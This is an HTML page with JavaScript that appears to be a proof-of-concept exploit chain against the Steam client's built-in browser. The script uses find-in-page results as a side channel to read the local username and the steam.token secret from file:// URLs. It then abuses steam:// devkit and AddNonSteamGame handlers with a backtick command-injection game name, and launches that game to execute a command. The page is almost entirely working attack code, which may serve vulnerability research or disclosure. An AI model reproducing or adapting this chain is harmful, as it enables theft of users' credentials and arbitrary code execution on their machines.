<html>

<body>
  <script>
    function sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    function log(msg) {
      document.getElementById("log").innerHTML += msg + "<br>";
    }

    async function main() {
      const SEARCH_TO_LEFT = 1;
      const SEARCH_TO_RIGHT = 2;
      const SEARCH_TO_BOTH = SEARCH_TO_LEFT | SEARCH_TO_RIGHT;
      const alpha_chars = "abcdefghijklmnopqrstuvwxyz";
      const hex_chars = "0123456789abcdef";
      const number_chars = "0123456789";

      async function is_str_in_bv(bv, s, count) {
        window.stage = 0;
        bv.FindInPage(s, true, true);
        while (window.stage < 3) { await sleep(10); }
        return window.count > count;
      }

      async function search_content(bv, base, charset, conflit, search_direction) {
        if (!search_direction) return;
        if (!base && search_direction != SEARCH_TO_BOTH) return;
        if (search_direction & SEARCH_TO_LEFT) {
          while (true) {
            found = false;
            for (c of charset) {
              teststr = c + base;
              count = conflit.length ? conflit.map((s) => { return s.search(teststr) == -1 ? 0 : 1; }).reduce((a, b) => { return a + b; }) : 0;
              if (await is_str_in_bv(bv, teststr, count)) {
                found = true;
                break;
              };
            }
            if (!found) break;
            base = teststr;
          }
        }

        if (search_direction & SEARCH_TO_RIGHT) {
          while (true) {
            found = false;
            for (c of charset) {
              teststr = base + c;
              count = conflit.length ? conflit.map((s) => { return s.search(teststr) == -1 ? 0 : 1; }).reduce((a, b) => { return a + b; }) : 0;
              if (await is_str_in_bv(bv, teststr, count)) {
                found = true;
                break;
              };
            }
            if (!found) break;
            base = teststr;
          }
        }
        return base;
      }

      ab_page = open("about:blank");
      s_client = ab_page.SteamClient;
      b_view = s_client.BrowserView.Create();
      b_view.LoadURL("file:///home/");
      await sleep(500);
      b_view.on("find-in-page-results", (a, b) => {
        if (window.stage == 0) {
          if (a == 0 && b == 0) { window.stage = 3; window.count = 0; }
          else window.stage++;
        }
        else if (window.stage++ == 2) window.count = a;
      });
      username = await search_content(b_view, "/", alpha_chars, ["home/"], SEARCH_TO_LEFT);
      log("username: " + username);

      b_view.LoadURL("file:///home/" + username + ".steam/steam.token");
      await sleep(500);
      token = await search_content(b_view, "", hex_chars, [], SEARCH_TO_BOTH);
      log("token: " + token);

      open("steam://openexternalforpid/1/steam://devkit-1/" + token + "/list-shortcuts?response=/tmp/addnonsteamgamefile");
      game_name = "`gnome-calculator`";
      open("steam://openexternalforpid/1/steam://open/steam://AddNonSteamGame/" + game_name);
      await sleep(500);

      b_view.LoadURL("file:///home/" + username + ".local/share/Steam/logs/console_log.txt");
      await sleep(500);
      gameid = game_name + "\": replacing 0 with ";
      init_id = gameid;
      gameid = await search_content(b_view, gameid, number_chars, [], SEARCH_TO_RIGHT);
      gameid = gameid.substring(init_id.length);
      log("gameid: " + gameid);
      gameid = (BigInt(gameid) << 32n) + 0x2000000n;
      gameid = gameid.toString();
      open("steam://openexternalforpid/1/steam://rungameid/" + gameid);

      s_client.BrowserView.Destroy(b_view);
      ab_page.close();
    }

    main();
  </script>

  <p id="log"></p>
</body>

</html>